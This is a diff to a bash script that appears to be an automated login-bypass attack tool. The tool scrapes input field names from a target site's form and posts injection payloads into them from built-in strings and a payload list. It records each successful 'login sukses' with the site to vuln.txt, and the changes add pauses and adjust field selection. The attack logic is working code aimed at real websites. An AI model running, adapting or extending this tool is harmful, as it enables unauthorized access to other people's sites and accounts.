@@ -520,7 +520,7 @@ fi
 if echo "$ng" | grep -Po 'name="[^"]*" value="[^"]*' >/dev/null;then
    value=$(echo "$ng" | grep -Po '(<input).*?(>)' | grep -Po 'name="[^"]*" value="[^"]*' | tr -d '"' | sed "s| value||g" | sed "s|name=||g" | sed -n -e 'H;${x;s/\n/\&/g;s/^,//;p;}')
 fi
-param=$(echo $ng | grep -Po '(<input).*?(>)' | grep -Po 'name="[^"]*' | cut -d '"' -f2 | tail -2 | awk '!a[$0]++' | sed -n -e 'H;${x;s/\n/,/g;s/^,//;p;}')
+param=$(echo $ng | grep -Po '(<input).*?(>)' | grep -Po 'name="[^"]*' | cut -d '"' -f2 | head -2 | awk '!a[$0]++' | sed -n -e 'H;${x;s/\n/,/g;s/^,//;p;}')
 param1=$(echo ${param} | awk -F "," '{print $1}')
 param2=$(echo ${param} | awk -F "," '{print $2}')
 postdata="$param1=$xploit&$param2=$xploit$value"
@@ -533,6 +533,7 @@ if echo $cek | grep -Po "User|user|password|Password|Username|username|email|Ema
    sukses="\n+++++++++++++++++++++!!![ login sukses ]!!!+++++++++++++++++++++\nSite: $target \nLogin: $xploit"
    echo -e "$sukses\n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++" >> vuln.txt 
    echo -e "\a${N}[${G}INFO${N}] ${N}Login suksess\n${O}site : ${N}${P}$target\n${O}Login: ${BL}$xploit\n${N}${P}Saved: vuln.txt\n${R}${P}++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++${N}"
+   sleep 3
    break
 fi
 done < <(echo -e "$xpl\n$xpl1\n$xpl2\n$(cat $list_xploit 2>/dev/null)")
@@ -560,6 +561,7 @@ if [[ "$sukses" = "" ]];then
          sukses="\n+++++++++++++++++++++!!![ login sukses ]!!!+++++++++++++++++++++\nSite: $target \nLogin: $xploit"
          echo -e "$sukses\n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++" >> vuln.txt 
          echo -e "\a${N}[${G}INFO${N}] ${N}Login suksess\n${O}site : ${N}${P}$target\n${O}Login: ${BL}$xploit\n${N}${P}Saved: vuln.txt\n${R}${P}++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++${N}"
+         sleep 3
          break
    #echo -e "Post data: $post -d "$postdata""
       fi
@@ -594,6 +596,7 @@ if [[ "$sukses" = "" ]];then
          sukses="\n+++++++++++++++++++++!!![ login sukses ]!!!+++++++++++++++++++++\nSite: $target \nLogin: $xploit"
          echo -e "$sukses\n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++" >> vuln.txt 
          echo -e "\a${N}[${G}INFO${N}] ${N}Login suksess\n${O}site : ${N}${P}$target\n${O}Login: ${BL}$xploit\n${N}${P}Saved: vuln.txt\n${R}${P}++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++${N}"
+         sleep 3
          break
    #echo -e "Post data: $post -d "$postdata""
       fi
